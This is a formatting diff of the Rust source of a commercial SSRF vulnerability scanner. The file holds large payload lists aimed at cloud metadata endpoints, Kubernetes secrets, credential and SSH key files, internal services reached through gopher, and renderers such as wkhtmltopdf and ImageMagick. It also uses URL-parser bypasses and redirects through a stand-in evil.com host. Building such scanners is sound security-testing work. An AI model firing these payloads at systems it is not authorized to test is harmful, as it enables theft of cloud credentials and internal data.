@@ -20,7 +20,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::oob_detector::{OobDetector, OobVulnType};
@@ -28,8 +27,8 @@ use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
-use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::Arc;
 use tokio::sync::Mutex;
 use tracing::{debug, info};
 
@@ -123,9 +122,11 @@ impl SsrfScanner {
             return Ok((Vec::new(), 0));
         }
 
-        info!("[SSRF] Enterprise scanner - testing parameter: {} (priority: {})",
-              parameter,
-              ParameterFilter::get_parameter_priority(parameter));
+        info!(
+            "[SSRF] Enterprise scanner - testing parameter: {} (priority: {})",
+            parameter,
+            ParameterFilter::get_parameter_priority(parameter)
+        );
 
         let baseline = match self.http_client.get(base_url).await {
             Ok(response) => response,
@@ -137,10 +138,12 @@ impl SsrfScanner {
 
         // Check if this is GraphQL/JSON API - use focused payloads
         let characteristics = AppCharacteristics::from_response(&baseline, base_url);
-        let is_json_api = characteristics.is_api ||
-                          baseline.headers.get("content-type")
-                              .map(|ct| ct.contains("application/json") || ct.contains("application/graphql"))
-                              .unwrap_or(false);
+        let is_json_api = characteristics.is_api
+            || baseline
+                .headers
+                .get("content-type")
+                .map(|ct| ct.contains("application/json") || ct.contains("application/graphql"))
+                .unwrap_or(false);
 
         // Generate payloads based on license tier and context
         let payloads = if is_json_api {
@@ -183,9 +186,19 @@ impl SsrfScanner {
                     }
 
                     let test_url = if url.contains('?') {
-                        format!("{}&{}={}", url, param, urlencoding::encode(&ssrf_payload.payload))
+                        format!(
+                            "{}&{}={}",
+                            url,
+                            param,
+                            urlencoding::encode(&ssrf_payload.payload)
+                        )
                     } else {
-                        format!("{}?{}={}", url, param, urlencoding::encode(&ssrf_payload.payload))
+                        format!(
+                            "{}?{}={}",
+                            url,
+                            param,
+                            urlencoding::encode(&ssrf_payload.payload)
+                        )
                     };
 
                     match client.get(&test_url).await {
@@ -193,9 +206,16 @@ impl SsrfScanner {
                             tests_completed.fetch_add(1, Ordering::Relaxed);
 
                             if let Some(vuln) = Self::analyze_ssrf_response_static(
-                                &response, &ssrf_payload, &param, &test_url, &baseline,
+                                &response,
+                                &ssrf_payload,
+                                &param,
+                                &test_url,
+                                &baseline,
                             ) {
-                                info!("[ALERT] SSRF vulnerability detected via {}", ssrf_payload.category.as_str());
+                                info!(
+                                    "[ALERT] SSRF vulnerability detected via {}",
+                                    ssrf_payload.category.as_str()
+                                );
                                 found_vuln.store(true, Ordering::Relaxed);
                                 let mut vulns = vulnerabilities.lock().await;
                                 vulns.push(vuln);
@@ -219,7 +239,11 @@ impl SsrfScanner {
         };
         let tests_run = tests_completed.load(Ordering::Relaxed);
 
-        info!("[SUCCESS] [SSRF] Completed {} tests, found {} vulnerabilities", tests_run, final_vulns.len());
+        info!(
+            "[SUCCESS] [SSRF] Completed {} tests, found {} vulnerabilities",
+            tests_run,
+            final_vulns.len()
+        );
         Ok((final_vulns, tests_run))
     }
 
@@ -311,10 +335,10 @@ impl SsrfScanner {
             "localhost6.localdomain6",
             "ip6-localhost",
             "ip6-loopback",
-            "localtest.me",         // Resolves to 127.0.0.1
-            "lvh.me",               // Resolves to 127.0.0.1
-            "vcap.me",              // Resolves to 127.0.0.1
-            "lacolhost.com",        // Resolves to 127.0.0.1
+            "localtest.me",  // Resolves to 127.0.0.1
+            "lvh.me",        // Resolves to 127.0.0.1
+            "vcap.me",       // Resolves to 127.0.0.1
+            "lacolhost.com", // Resolves to 127.0.0.1
             "127.0.0.1.nip.io",
             "127.0.0.1.sslip.io",
             "127.0.0.1.xip.io",
@@ -351,8 +375,8 @@ impl SsrfScanner {
         variations.extend(zero_ip.iter().map(|s| s.to_string()));
 
         // Additional encoding tricks
-        variations.push("①②⑦.⓪.⓪.①".to_string());  // Unicode circled numbers
-        variations.push("127。0。0。1".to_string());    // Fullwidth dots
+        variations.push("①②⑦.⓪.⓪.①".to_string()); // Unicode circled numbers
+        variations.push("127。0。0。1".to_string()); // Fullwidth dots
 
         variations
     }
@@ -366,7 +390,7 @@ impl SsrfScanner {
 
         // Additional metadata IPs
         variations.extend(self.generate_ip_variations("100.100.100.200")); // Alibaba
-        variations.extend(self.generate_ip_variations("168.63.129.16"));   // Azure Wire Server
+        variations.extend(self.generate_ip_variations("168.63.129.16")); // Azure Wire Server
 
         // GCP metadata hostname
         let gcp_hosts = vec![
@@ -415,7 +439,11 @@ impl SsrfScanner {
 
         // Generate payloads for AWS with all IP variations
         for ip in &metadata_ips {
-            if ip.contains("169.254.169.254") || ip.contains("2852039166") || ip.contains("0xa9fea9fe") || ip.parse::<u32>().is_ok() {
+            if ip.contains("169.254.169.254")
+                || ip.contains("2852039166")
+                || ip.contains("0xa9fea9fe")
+                || ip.parse::<u32>().is_ok()
+            {
                 for path in &aws_paths {
                     payloads.push(SsrfPayload {
                         payload: format!("http://{}{}", ip, path),
@@ -566,13 +594,25 @@ impl SsrfScanner {
 
         // Kubernetes / Container metadata
         let k8s_payloads = vec![
-            ("http://kubernetes.default.svc/api/v1/namespaces/default/secrets", "K8s secrets"),
-            ("http://kubernetes.default.svc/api/v1/namespaces/default/pods", "K8s pods"),
-            ("http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets", "K8s kube-system secrets"),
+            (
+                "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
+                "K8s secrets",
+            ),
+            (
+                "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
+                "K8s pods",
+            ),
+            (
+                "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
+                "K8s kube-system secrets",
+            ),
             ("http://kubernetes.default.svc:443/api/v1/", "K8s API"),
             ("https://kubernetes.default.svc/api/v1/", "K8s API HTTPS"),
             ("http://rancher-metadata/", "Rancher metadata"),
-            ("http://rancher-metadata/latest/self/container", "Rancher container"),
+            (
+                "http://rancher-metadata/latest/self/container",
+                "Rancher container",
+            ),
         ];
         for (url, desc) in k8s_payloads {
             payloads.push(SsrfPayload {
@@ -633,28 +673,64 @@ impl SsrfScanner {
 
         // RFC 1918 private ranges - sample IPs
         let internal_ips = vec![
-            "10.0.0.1", "10.0.0.100", "10.0.0.254",
-            "10.1.0.1", "10.1.1.1", "10.10.10.10",
-            "10.255.255.1", "10.255.255.254",
-            "172.16.0.1", "172.16.0.100", "172.16.0.254",
-            "172.17.0.1", "172.18.0.1", "172.19.0.1",
-            "172.31.0.1", "172.31.255.254",
-            "192.168.0.1", "192.168.0.100", "192.168.0.254",
-            "192.168.1.1", "192.168.1.100", "192.168.1.254",
-            "192.168.2.1", "192.168.10.1", "192.168.100.1",
+            "10.0.0.1",
+            "10.0.0.100",
+            "10.0.0.254",
+            "10.1.0.1",
+            "10.1.1.1",
+            "10.10.10.10",
+            "10.255.255.1",
+            "10.255.255.254",
+            "172.16.0.1",
+            "172.16.0.100",
+            "172.16.0.254",
+            "172.17.0.1",
+            "172.18.0.1",
+            "172.19.0.1",
+            "172.31.0.1",
+            "172.31.255.254",
+            "192.168.0.1",
+            "192.168.0.100",
+            "192.168.0.254",
+            "192.168.1.1",
+            "192.168.1.100",
+            "192.168.1.254",
+            "192.168.2.1",
+            "192.168.10.1",
+            "192.168.100.1",
         ];
 
         // Common internal hostnames
         let internal_hosts = vec![
-            "internal", "intranet", "localhost", "backend",
-            "api", "api.internal", "db", "database",
-            "mysql", "postgres", "redis", "elasticsearch",
-            "consul", "vault", "jenkins", "gitlab",
-            "jira", "confluence", "splunk", "grafana",
-            "prometheus", "kibana", "admin", "management",
+            "internal",
+            "intranet",
+            "localhost",
+            "backend",
+            "api",
+            "api.internal",
+            "db",
+            "database",
+            "mysql",
+            "postgres",
+            "redis",
+            "elasticsearch",
+            "consul",
+            "vault",
+            "jenkins",
+            "gitlab",
+            "jira",
+            "confluence",
+            "splunk",
+            "grafana",
+            "prometheus",
+            "kibana",
+            "admin",
+            "management",
         ];
 
-        let ports = vec!["", ":80", ":8080", ":443", ":8443", ":9200", ":6379", ":3306"];
+        let ports = vec![
+            "", ":80", ":8080", ":443", ":8443", ":9200", ":6379", ":3306",
+        ];
 
         for ip in &internal_ips {
             for port in &ports {
@@ -687,21 +763,42 @@ impl SsrfScanner {
 
         // File protocol payloads
         let file_paths = vec![
-            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
-            "/etc/resolv.conf", "/etc/issue", "/etc/motd", "/etc/group",
-            "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
-            "/proc/version", "/proc/net/fib_trie", "/proc/net/arp",
-            "/proc/net/tcp", "/proc/net/udp", "/proc/mounts",
-            "/root/.ssh/id_rsa", "/root/.ssh/id_dsa", "/root/.ssh/authorized_keys",
-            "/root/.bash_history", "/root/.mysql_history",
-            "/var/log/apache2/access.log", "/var/log/apache2/error.log",
-            "/var/log/nginx/access.log", "/var/log/nginx/error.log",
-            "/var/log/auth.log", "/var/log/syslog",
-            "/home/user/.ssh/id_rsa", "/home/user/.bash_history",
+            "/etc/passwd",
+            "/etc/shadow",
+            "/etc/hosts",
+            "/etc/hostname",
+            "/etc/resolv.conf",
+            "/etc/issue",
+            "/etc/motd",
+            "/etc/group",
+            "/proc/self/environ",
+            "/proc/self/cmdline",
+            "/proc/self/status",
+            "/proc/version",
+            "/proc/net/fib_trie",
+            "/proc/net/arp",
+            "/proc/net/tcp",
+            "/proc/net/udp",
+            "/proc/mounts",
+            "/root/.ssh/id_rsa",
+            "/root/.ssh/id_dsa",
+            "/root/.ssh/authorized_keys",
+            "/root/.bash_history",
+            "/root/.mysql_history",
+            "/var/log/apache2/access.log",
+            "/var/log/apache2/error.log",
+            "/var/log/nginx/access.log",
+            "/var/log/nginx/error.log",
+            "/var/log/auth.log",
+            "/var/log/syslog",
+            "/home/user/.ssh/id_rsa",
+            "/home/user/.bash_history",
             // Windows
-            "c:/windows/win.ini", "c:/windows/system.ini",
+            "c:/windows/win.ini",
+            "c:/windows/system.ini",
             "c:/windows/system32/drivers/etc/hosts",
-            "c:/boot.ini", "c:/inetpub/logs/logfiles",
+            "c:/boot.ini",
+            "c:/inetpub/logs/logfiles",
         ];
 
         for path in &file_paths {
@@ -722,10 +819,16 @@ impl SsrfScanner {
         // Gopher protocol payloads (can interact with various services)
         let gopher_payloads = vec![
             ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis INFO"),
-            ("gopher://127.0.0.1:6379/_CONFIG%20GET%20*", "Gopher Redis CONFIG"),
+            (
+                "gopher://127.0.0.1:6379/_CONFIG%20GET%20*",
+                "Gopher Redis CONFIG",
+            ),
             ("gopher://127.0.0.1:6379/_KEYS%20*", "Gopher Redis KEYS"),
             ("gopher://127.0.0.1:11211/_stats", "Gopher Memcached"),
-            ("gopher://127.0.0.1:11211/_version", "Gopher Memcached version"),
+            (
+                "gopher://127.0.0.1:11211/_version",
+                "Gopher Memcached version",
+            ),
             ("gopher://127.0.0.1:25/_HELO%20localhost", "Gopher SMTP"),
             ("gopher://127.0.0.1:3306/", "Gopher MySQL"),
             ("gopher://127.0.0.1:5432/", "Gopher PostgreSQL"),
@@ -783,43 +886,54 @@ impl SsrfScanner {
         // These target differences in URL parsing between validators and backend
         let parser_tricks = vec![
             // Credential section bypass
-            ("http://evil.com@169.254.169.254/latest/meta-data/", "@ credential bypass"),
+            (
+                "http://evil.com@169.254.169.254/latest/meta-data/",
+                "@ credential bypass",
+            ),
             ("http://169.254.169.254@evil.com/", "@ reversed"),
             ("http://169.254.169.254%40evil.com/", "Encoded @"),
             ("http://evil.com:80@169.254.169.254/", "Port in creds"),
-            ("http://evil.com:password@169.254.169.254/", "Password in creds"),
-
+            (
+                "http://evil.com:password@169.254.169.254/",
+                "Password in creds",
+            ),
             // Fragment bypass
             ("http://169.254.169.254#@evil.com/", "Fragment #@"),
             ("http://evil.com#.169.254.169.254/", "Fragment with dot"),
-
             // Backslash (Windows path separator)
             ("http://169.254.169.254\\@evil.com/", "Backslash bypass"),
             ("http://evil.com\\169.254.169.254/", "Backslash path"),
-
             // Tab/newline
             ("http://169.254.169.254%09/latest/meta-data/", "Tab in URL"),
             ("http://169.254.169.254%0d/latest/meta-data/", "CR in URL"),
             ("http://169.254.169.254%0a/latest/meta-data/", "LF in URL"),
-            ("http://169.254.169.254%0d%0a/latest/meta-data/", "CRLF in URL"),
-
+            (
+                "http://169.254.169.254%0d%0a/latest/meta-data/",
+                "CRLF in URL",
+            ),
             // Unicode dots and slashes
             ("http://169。254。169。254/", "Unicode fullwidth dots"),
             ("http://169．254．169．254/", "Unicode halfwidth dots"),
-            ("http://169%E3%80%82254%E3%80%82169%E3%80%82254/", "Encoded unicode dots"),
-
+            (
+                "http://169%E3%80%82254%E3%80%82169%E3%80%82254/",
+                "Encoded unicode dots",
+            ),
             // Double/triple slashes
             ("http:///169.254.169.254/", "Triple slash"),
             ("http:\\\\169.254.169.254/", "Double backslash"),
-
             // Case manipulation
             ("HTTP://169.254.169.254/", "Uppercase protocol"),
             ("hTtP://169.254.169.254/", "Mixed case protocol"),
-
             // Path normalization
             ("http://169.254.169.254/./latest/meta-data/", "Dot in path"),
-            ("http://169.254.169.254/../169.254.169.254/latest/meta-data/", "Dotdot path"),
-            ("http://169.254.169.254//latest//meta-data/", "Double slash path"),
+            (
+                "http://169.254.169.254/../169.254.169.254/latest/meta-data/",
+                "Dotdot path",
+            ),
+            (
+                "http://169.254.169.254//latest//meta-data/",
+                "Double slash path",
+            ),
         ];
 
         for (url, desc) in parser_tricks {
@@ -840,9 +954,18 @@ impl SsrfScanner {
 
         // DNS rebinding services
         let rebind_payloads = vec![
-            ("http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/", "rebind.network to metadata"),
-            ("http://make-127-0-0-1-and-169-254-169-254-rr.1u.ms/", "1u.ms rebind"),
-            ("http://make-169-254-169-254-rebind-127-0-0-1-rr.1u.ms/", "1u.ms rebind reversed"),
+            (
+                "http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/",
+                "rebind.network to metadata",
+            ),
+            (
+                "http://make-127-0-0-1-and-169-254-169-254-rr.1u.ms/",
+                "1u.ms rebind",
+            ),
+            (
+                "http://make-169-254-169-254-rebind-127-0-0-1-rr.1u.ms/",
+                "1u.ms rebind reversed",
+            ),
             ("http://7f000001.c0a80001.rbndr.us/", "rbndr.us rebind"),
             ("http://localtest.me/", "localtest.me"),
             ("http://127.0.0.1.nip.io/", "nip.io localhost"),
@@ -913,27 +1036,27 @@ impl SsrfScanner {
         let html_payloads = vec![
             (
                 r#"<html><body><iframe src="http://169.254.169.254/latest/meta-data/"></iframe></body></html>"#,
-                "wkhtmltopdf iframe metadata"
+                "wkhtmltopdf iframe metadata",
             ),
             (
                 r#"<html><body><iframe src="http://127.0.0.1:80/"></iframe></body></html>"#,
-                "wkhtmltopdf iframe localhost"
+                "wkhtmltopdf iframe localhost",
             ),
             (
                 r#"<html><body><iframe src="http://192.168.1.1/admin"></iframe></body></html>"#,
-                "wkhtmltopdf iframe internal"
+                "wkhtmltopdf iframe internal",
             ),
             (
                 r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
-                "wkhtmltopdf img metadata"
+                "wkhtmltopdf img metadata",
             ),
             (
                 r#"<html><body><object data="http://169.254.169.254/latest/meta-data/"></object></body></html>"#,
-                "wkhtmltopdf object metadata"
+                "wkhtmltopdf object metadata",
             ),
             (
                 r#"<html><body><embed src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
-                "wkhtmltopdf embed metadata"
+                "wkhtmltopdf embed metadata",
             ),
         ];
 
@@ -950,19 +1073,19 @@ impl SsrfScanner {
         let css_payloads = vec![
             (
                 r#"<html><head><link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
-                "WeasyPrint CSS metadata"
+                "WeasyPrint CSS metadata",
             ),
             (
                 r#"<html><head><link rel="stylesheet" href="http://192.168.1.1/style.css"></head><body>Test</body></html>"#,
-                "WeasyPrint CSS internal"
+                "WeasyPrint CSS internal",
             ),
             (
                 r#"<html><head><style>@import url('http://169.254.169.254/latest/meta-data/');</style></head><body>Test</body></html>"#,
-                "WeasyPrint @import metadata"
+                "WeasyPrint @import metadata",
             ),
             (
                 r#"<html><body style="background: url('http://169.254.169.254/latest/meta-data/')">Test</body></html>"#,
-                "WeasyPrint background-url metadata"
+                "WeasyPrint background-url metadata",
             ),
         ];
 
@@ -979,15 +1102,15 @@ impl SsrfScanner {
         let chrome_payloads = vec![
             (
                 r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
-                "Chrome headless img metadata"
+                "Chrome headless img metadata",
             ),
             (
                 r#"<html><body><script src="http://169.254.169.254/latest/meta-data/"></script></body></html>"#,
-                "Chrome headless script metadata"
+                "Chrome headless script metadata",
             ),
             (
                 r#"<html><head><link rel="prefetch" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
-                "Chrome headless prefetch metadata"
+                "Chrome headless prefetch metadata",
             ),
         ];
 
@@ -1004,15 +1127,15 @@ impl SsrfScanner {
         let svg_payloads = vec![
             (
                 r#"<html><body><svg><image xlink:href="http://169.254.169.254/latest/meta-data/"></image></svg></body></html>"#,
-                "SVG image xlink metadata"
+                "SVG image xlink metadata",
             ),
             (
                 r#"<html><body><svg><use xlink:href="http://169.254.169.254/latest/meta-data/"></use></svg></body></html>"#,
-                "SVG use xlink metadata"
+                "SVG use xlink metadata",
             ),
             (
                 r#"<html><body><svg><foreignObject><img src="http://169.254.169.254/latest/meta-data/"/></foreignObject></svg></body></html>"#,
-                "SVG foreignObject img metadata"
+                "SVG foreignObject img metadata",
             ),
         ];
 
@@ -1029,11 +1152,11 @@ impl SsrfScanner {
         let file_payloads = vec![
             (
                 r#"<html><body><iframe src="file:///etc/passwd"></iframe></body></html>"#,
-                "PDF generator file:// /etc/passwd"
+                "PDF generator file:// /etc/passwd",
             ),
             (
                 r#"<html><body><img src="file:///etc/hosts"></body></html>"#,
-                "PDF generator file:// /etc/hosts"
+                "PDF generator file:// /etc/hosts",
             ),
         ];
 
@@ -1058,19 +1181,19 @@ impl SsrfScanner {
         let svg_payloads = vec![
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
-                "ImageMagick SVG xlink metadata"
+                "ImageMagick SVG xlink metadata",
             ),
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://127.0.0.1:6379/"/></svg>"#,
-                "ImageMagick SVG xlink localhost Redis"
+                "ImageMagick SVG xlink localhost Redis",
             ),
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://192.168.1.1/admin"/></svg>"#,
-                "ImageMagick SVG xlink internal"
+                "ImageMagick SVG xlink internal",
             ),
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
-                "ImageMagick SVG use xlink metadata"
+                "ImageMagick SVG use xlink metadata",
             ),
         ];
 
@@ -1087,11 +1210,11 @@ impl SsrfScanner {
         let mvg_payloads = vec![
             (
                 r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/' pop graphic-context"#,
-                "ImageMagick MVG metadata"
+                "ImageMagick MVG metadata",
             ),
             (
                 r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://127.0.0.1:80/' pop graphic-context"#,
-                "ImageMagick MVG localhost"
+                "ImageMagick MVG localhost",
             ),
         ];
 
@@ -1108,11 +1231,11 @@ impl SsrfScanner {
         let msl_payloads = vec![
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://169.254.169.254/latest/meta-data/" /></image>"#,
-                "ImageMagick MSL read metadata"
+                "ImageMagick MSL read metadata",
             ),
             (
                 r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://127.0.0.1/" /></image>"#,
-                "ImageMagick MSL read localhost"
+                "ImageMagick MSL read localhost",
             ),
         ];
 
@@ -1127,9 +1250,18 @@ impl SsrfScanner {
 
         // URL-based image references (for endpoints that fetch images)
         let url_payloads = vec![
-            ("https://example.com/logo.svg#http://169.254.169.254/latest/meta-data/", "SVG URL fragment metadata"),
-            ("https://example.com/logo.svg?url=http://169.254.169.254/latest/meta-data/", "SVG URL param metadata"),
-            ("http://169.254.169.254/latest/meta-data/logo.svg", "Direct SVG metadata URL"),
+            (
+                "https://example.com/logo.svg#http://169.254.169.254/latest/meta-data/",
+                "SVG URL fragment metadata",
+            ),
+            (
+                "https://example.com/logo.svg?url=http://169.254.169.254/latest/meta-data/",
+                "SVG URL param metadata",
+            ),
+            (
+                "http://169.254.169.254/latest/meta-data/logo.svg",
+                "Direct SVG metadata URL",
+            ),
             ("http://127.0.0.1/image.png", "Direct localhost image"),
             ("http://192.168.1.1/admin/logo.png", "Direct internal image"),
         ];
@@ -1224,7 +1356,10 @@ impl SsrfScanner {
         // JAR protocol (Java)
         let jar_payloads = vec![
             ("jar:http://127.0.0.1/malicious.jar!/", "JAR localhost"),
-            ("jar:http://169.254.169.254/latest/meta-data/!/", "JAR AWS metadata"),
+            (
+                "jar:http://169.254.169.254/latest/meta-data/!/",
+                "JAR AWS metadata",
+            ),
             ("jar:file:///etc/passwd!/", "JAR file protocol"),
         ];
 
@@ -1239,10 +1374,16 @@ impl SsrfScanner {
 
         // Additional file:// paths
         let file_paths = vec![
-            ("file:///c:/windows/system32/drivers/etc/hosts", "Windows hosts"),
+            (
+                "file:///c:/windows/system32/drivers/etc/hosts",
+                "Windows hosts",
+            ),
             ("file:///c:/windows/win.ini", "Windows win.ini"),
             ("file:///c:/boot.ini", "Windows boot.ini"),
-            ("file://\\\\127.0.0.1\\c$\\windows\\win.ini", "UNC localhost"),
+            (
+                "file://\\\\127.0.0.1\\c$\\windows\\win.ini",
+                "UNC localhost",
+            ),
             ("file://127.0.0.1/etc/passwd", "File with host"),
         ];
 
@@ -1265,8 +1406,14 @@ impl SsrfScanner {
 
         // Direct metadata URLs for preview
         let preview_urls = vec![
-            ("http://169.254.169.254/latest/meta-data/", "Preview AWS metadata"),
-            ("http://metadata.google.internal/computeMetadata/v1/", "Preview GCP metadata"),
+            (
+                "http://169.254.169.254/latest/meta-data/",
+                "Preview AWS metadata",
+            ),
+            (
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "Preview GCP metadata",
+            ),
             ("http://127.0.0.1/", "Preview localhost"),
             ("http://127.0.0.1:6379/", "Preview Redis"),
             ("http://127.0.0.1:9200/", "Preview Elasticsearch"),
@@ -1287,9 +1434,18 @@ impl SsrfScanner {
         // Redirect-based preview bypass
         // These would require a redirect service, but we test the pattern
         let redirect_patterns = vec![
-            ("http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/", "Preview redirect metadata"),
-            ("http://evil.com/redirect?url=http://127.0.0.1/", "Preview redirect localhost"),
-            ("http://evil.com/r?to=http://192.168.1.1/admin", "Preview redirect internal"),
+            (
+                "http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/",
+                "Preview redirect metadata",
+            ),
+            (
+                "http://evil.com/redirect?url=http://127.0.0.1/",
+                "Preview redirect localhost",
+            ),
+            (
+                "http://evil.com/r?to=http://192.168.1.1/admin",
+                "Preview redirect internal",
+            ),
         ];
 
         for (url, desc) in redirect_patterns {
@@ -1303,7 +1459,10 @@ impl SsrfScanner {
 
         // OpenGraph meta tag URLs (these get fetched by preview tools)
         let opengraph_urls = vec![
-            ("http://169.254.169.254/latest/meta-data/og-image.jpg", "OpenGraph metadata image"),
+            (
+                "http://169.254.169.254/latest/meta-data/og-image.jpg",
+                "OpenGraph metadata image",
+            ),
             ("http://127.0.0.1/og-image.png", "OpenGraph localhost image"),
             ("http://192.168.1.1/preview.jpg", "OpenGraph internal image"),
         ];
@@ -1381,9 +1540,18 @@ impl SsrfScanner {
 
         // Cloud metadata webhooks
         let metadata_webhooks = vec![
-            ("http://169.254.169.254/latest/meta-data/", "Webhook AWS metadata"),
-            ("http://metadata.google.internal/computeMetadata/v1/", "Webhook GCP metadata"),
-            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Webhook Azure metadata"),
+            (
+                "http://169.254.169.254/latest/meta-data/",
+                "Webhook AWS metadata",
+            ),
+            (
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "Webhook GCP metadata",
+            ),
+            (
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                "Webhook Azure metadata",
+            ),
         ];
 
         for (url, desc) in metadata_webhooks {
@@ -1398,7 +1566,10 @@ impl SsrfScanner {
         // Service discovery webhooks
         let service_webhooks = vec![
             ("http://redis:6379/", "Webhook Redis service"),
-            ("http://elasticsearch:9200/", "Webhook Elasticsearch service"),
+            (
+                "http://elasticsearch:9200/",
+                "Webhook Elasticsearch service",
+            ),
             ("http://mysql:3306/", "Webhook MySQL service"),
             ("http://postgres:5432/", "Webhook PostgreSQL service"),
             ("http://mongodb:27017/", "Webhook MongoDB service"),
@@ -1531,10 +1702,23 @@ impl SsrfScanner {
         let mut payloads = Vec::new();
 
         // Cloud metadata - CRITICAL for APIs running in cloud
-        payloads.extend(self.generate_cloud_metadata_payloads().into_iter().take(150));
+        payloads.extend(
+            self.generate_cloud_metadata_payloads()
+                .into_iter()
+                .take(150),
+        );
 
         // Localhost variants - APIs often access internal services
-        for host in &["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "2130706433", "0x7f000001", "127.1", "127.0.1"] {
+        for host in &[
+            "127.0.0.1",
+            "localhost",
+            "0.0.0.0",
+            "[::1]",
+            "2130706433",
+            "0x7f000001",
+            "127.1",
+            "127.0.1",
+        ] {
             payloads.push(SsrfPayload {
                 payload: format!("http://{}/", host),
                 category: SsrfBypassCategory::LocalhostBypass,
@@ -1553,7 +1737,10 @@ impl SsrfScanner {
             });
         }
 
-        info!("[SSRF] Generated {} focused API payloads (optimized for GraphQL/REST)", payloads.len());
+        info!(
+            "[SSRF] Generated {} focused API payloads (optimized for GraphQL/REST)",
+            payloads.len()
+        );
         payloads
     }
 
@@ -1606,10 +1793,21 @@ impl SsrfScanner {
         let mut payloads = Vec::new();
 
         // Only critical cloud metadata
-        payloads.extend(self.generate_cloud_metadata_payloads().into_iter().take(100));
+        payloads.extend(
+            self.generate_cloud_metadata_payloads()
+                .into_iter()
+                .take(100),
+        );
 
         // Basic localhost
-        for host in &["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "2130706433", "0x7f000001"] {
+        for host in &[
+            "127.0.0.1",
+            "localhost",
+            "0.0.0.0",
+            "[::1]",
+            "2130706433",
+            "0x7f000001",
+        ] {
             payloads.push(SsrfPayload {
                 payload: format!("http://{}/", host),
                 category: SsrfBypassCategory::LocalhostBypass,
@@ -1683,71 +1881,168 @@ impl SsrfScanner {
 
         // AWS indicators
         let aws_indicators = [
-            "ami-id", "instance-id", "availability-zone", "iam/security-credentials",
-            "accesskeyid", "secretaccesskey", "token", "meta-data", "user-data",
-            "public-ipv4", "local-ipv4", "instance-type",
+            "ami-id",
+            "instance-id",
+            "availability-zone",
+            "iam/security-credentials",
+            "accesskeyid",
+            "secretaccesskey",
+            "token",
+            "meta-data",
+            "user-data",
+            "public-ipv4",
+            "local-ipv4",
+            "instance-type",
         ];
 
         // GCP indicators
         let gcp_indicators = [
-            "computemetadata", "service-accounts", "project-id", "instance/zone",
-            "access_token", "token_type",
+            "computemetadata",
+            "service-accounts",
+            "project-id",
+            "instance/zone",
+            "access_token",
+            "token_type",
         ];
 
         // Azure indicators
         let azure_indicators = [
-            "subscriptionid", "resourcegroupname", "vmid", "platformfaultdomain",
-            "managedidentity", "oauth2/token",
+            "subscriptionid",
+            "resourcegroupname",
+            "vmid",
+            "platformfaultdomain",
+            "managedidentity",
+            "oauth2/token",
         ];
 
         // Internal service indicators
         let internal_indicators = [
-            "root:x:", "daemon:x:", "redis_version", "elasticsearch", "mongodb",
-            "postgresql", "mysql", "nginx", "apache", "uid=", "gid=",
+            "root:x:",
+            "daemon:x:",
+            "redis_version",
+            "elasticsearch",
+            "mongodb",
+            "postgresql",
+            "mysql",
+            "nginx",
+            "apache",
+            "uid=",
+            "gid=",
         ];
 
         for indicator in &aws_indicators {
-            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) && significant_change {
-                return Some(Self::create_vulnerability_static(parameter, &ssrf_payload.payload, test_url,
-                    &format!("AWS metadata accessible via {}", ssrf_payload.category.as_str()),
-                    Confidence::High, format!("AWS indicator: {}", indicator), &ssrf_payload.category));
+            if body_lower.contains(indicator)
+                && !baseline_lower.contains(indicator)
+                && significant_change
+            {
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &ssrf_payload.payload,
+                    test_url,
+                    &format!(
+                        "AWS metadata accessible via {}",
+                        ssrf_payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("AWS indicator: {}", indicator),
+                    &ssrf_payload.category,
+                ));
             }
         }
 
         for indicator in &gcp_indicators {
-            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) && significant_change {
